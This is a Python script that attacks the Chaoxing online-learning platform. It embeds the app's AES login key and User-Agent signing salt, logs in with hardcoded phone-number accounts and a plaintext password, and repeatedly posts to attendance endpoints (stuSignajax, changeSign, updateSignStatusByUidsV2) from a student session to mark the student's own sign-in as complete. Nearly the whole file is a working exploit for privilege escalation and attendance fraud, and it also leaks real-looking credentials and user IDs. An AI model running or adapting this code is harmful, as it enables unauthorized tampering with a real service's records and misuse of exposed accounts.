import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"关键漏洞验证：学生端直接修改签到状态")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n" + "=" * 80)
    print("[2] 获取所有签到活动，找到学生未签到的活动")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    print(f"  学生活动列表: {len(active_list)} 个活动")

    unsigned_aids = []
    for act in active_list:
        aid = str(act.get("id", ""))
        name = act.get("name", "")
        status = act.get("status", "")
        atype = act.get("type", 0)
        if atype == 2:
            print(f"  签到活动: aid={aid}, name={name}, status={status}")
            unsigned_aids.append(aid)

    print("\n" + "=" * 80)
    print("[3] 关键测试：stuSignajax在未签到状态下是否接受status参数")
    print("=" * 80)

    for aid in unsigned_aids[:5]:
        print(f"\n--- 测试活动 {aid} ---")

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        sign_data = safe_json(r)
        print(f"  当前签到状态: {json.dumps(sign_data, ensure_ascii=False)[:200]}")

        current_status = None
        if isinstance(sign_data, dict) and "data" in sign_data:
            sign_list = sign_data["data"].get("signList", []) or sign_data["data"].get("signIn", [])
            if sign_list:
                current_status = sign_list[0].get("status") if isinstance(sign_list, list) else None

        if current_status is not None:
            print(f"  已签到，status={current_status}，跳过stuSignajax测试")
            continue

        print(f"  未签到！开始测试stuSignajax...")

        for status_val in ["1", "2", "0"]:
            r = s_s.post(f"{base}/pptSign/stuSignajax",
                         data={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                               "courseId": COURSE_ID, "status": status_val,
                               "lat": "", "lon": "", "address": "", "signType": "0"},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                         timeout=20)
            rec(f"T3-stuSignajax-status{status_val}-{aid[:8]}",
                f"stuSignajax+status={status_val}: {r.text[:100]}", r.text[:300])

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        after_data = safe_json(r)
        print(f"  签到后状态: {json.dumps(after_data, ensure_ascii=False)[:200]}")

    print("\n" + "=" * 80)
    print("[4] changeSign端点深入测试")
    print("=" * 80)

    for aid in unsigned_aids[:3]:
        print(f"\n--- changeSign测试 活动 {aid} ---")

        r = s_s.post(f"{base}/pptSign/changeSign",
                     data={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                           "courseId": COURSE_ID, "status": "2"},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        rec(f"T4-changeSign-POST-{aid[:8]}",
            f"学生POST changeSign: HTTP {r.status_code}, {r.text[:150]}", r.text[:300])

        r = s_s.get(f"{base}/pptSign/changeSign",
                    params={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                            "courseId": COURSE_ID, "status": "2"},
                    headers={"Referer": f"{base}/"},
                    timeout=20)
        rec(f"T4-changeSign-GET-{aid[:8]}",
            f"学生GET changeSign: HTTP {r.status_code}, {r.text[:150]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] learn.chaoxing.com/apis/ 路径深入测试")
    print("=" * 80)

    learn_base = "https://learn.chaoxing.com"

    learn_apis = [
        "/apis/pptSign/updateSignStatusByUidsV2",
        "/apis/pptSign/updateSignStatus",
        "/apis/pptSign/updateSignStatusByUids",
        "/apis/pptSign/stuSignajax",
        "/apis/pptSign/changeSign",
        "/apis/pptSign/doSign",
        "/apis/pptSign/signIn",
        "/apis/sign/updateSignStatusByUidsV2",
        "/apis/sign/updateSignStatus",
        "/apis/sign/signIn",
        "/apis/sign/doSign",
    ]

    for api_path in learn_apis:
        url = f"{learn_base}{api_path}"
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.post(url,
                                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                                         "activeId": TEST_AID},
                                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                                       "activeId": TEST_AID, "classId": CLASS_ID, "courseId": COURSE_ID,
                                       "uid": puid_s if label == "学生" else puid_t},
                                 headers={"Referer": f"{learn_base}/", "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=15)
                short_name = api_path.split("/")[-1][:25]
                rec(f"T5-learn-{short_name}-{label}",
                    f"{label} POST learn{api_path}: HTTP {r.status_code}, {r.text[:100]}",
                    r.text[:300])
            except Exception as e:
                short_name = api_path.split("/")[-1][:25]
                rec(f"T5-learn-{short_name}-{label}",
                    f"{label} POST learn{api_path}: ERROR {str(e)[:80]}")

    print("\n" + "=" * 80)
    print("[6] 学生Web登录后从签到页面发起请求")
    print("=" * 80)

    s_s_web = requests.Session()
    s_s_web.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s_s_web.headers.update({"User-Agent": web_ua})

    s_s_web.post("https://passport2.chaoxing.com/fanyalogin",
                 data={"fid": "-1", "uname": "18436633997", "password": "3.1415926Cpy",
                       "refer": "http://i.mooc.chaoxing.com", "t": "true",
                       "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
                 headers={"X-Requested-With": "XMLHttpRequest"},
                 allow_redirects=False, timeout=30)
    try:
        s_s_web.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    for aid in unsigned_aids[:3]:
        sign_page = f"{base}/pptSign/signedResult?activeId={aid}&classId={CLASS_ID}&courseId={COURSE_ID}&uid={puid_s}"
        try:
            r = s_s_web.get(sign_page, timeout=20, allow_redirects=True)
            print(f"  签到结果页: HTTP {r.status_code}, len={len(r.text)}")

            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)
            print(f"  JS文件: {js_urls[:5]}")

            api_urls = re.findall(r'(?:fetch|axios|XMLHttpRequest|\.ajax|\.post|\.get)\s*\(?[\'"]([^\'"]+pptSign[^\'"]+)', r.text)
            print(f"  API调用: {api_urls[:5]}")

            status_refs = re.findall(r'status[^;]{0,100}', r.text)
            print(f"  status引用: {status_refs[:3]}")
        except Exception as e:
            print(f"  ERROR: {e}")

        r = s_s_web.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                         data={"uids": STUDENT_PUID, "status": "2", "remark": ""},
                         headers={"Referer": sign_page, "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded",
                                  "Origin": "https://mobilelearn.chaoxing.com"},
                         timeout=20)
        rec(f"T6-web-signedResult-{aid[:8]}",
            f"学生从签到结果页调用: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[7] 探索mooc1-api.chaoxing.com/mooc-ans/下的签到API")
    print("=" * 80)

    mooc_api_base = "https://mooc1-api.chaoxing.com/mooc-ans"

    mooc_api_paths = [
        "/pptSign/updateSignStatusByUidsV2",
        "/pptSign/updateSignStatus",
        "/pptSign/stuSignajax",
        "/sign/updateSignStatusByUidsV2",
        "/sign/updateSignStatus",
        "/v2/apis/sign/updateSignStatusByUidsV2",
        "/v2/apis/sign/updateSignStatus",
    ]

    for api_path in mooc_api_paths:
        url = f"{mooc_api_base}{api_path}"
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.post(url,
                                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId",
                                         "activeId": TEST_AID},
                                 data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                                       "activeId": TEST_AID, "classId": CLASS_ID, "courseId": COURSE_ID},
                                 headers={"Referer": f"{mooc_api_base}/", "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=15)
                short_name = api_path.split("/")[-1][:25]
                rec(f"T7-moocapi-{short_name}-{label}",
                    f"{label} POST mooc-api{api_path}: HTTP {r.status_code}, {r.text[:100]}",
                    r.text[:300])
            except Exception as e:
                short_name = api_path.split("/")[-1][:25]
                rec(f"T7-moocapi-{short_name}-{label}",
                    f"{label} POST mooc-api{api_path}: ERROR {str(e)[:80]}")

    print("\n" + "=" * 80)
    print("[8] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "critical_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 无权限: {perm}")

if __name__ == "__main__":
    run()
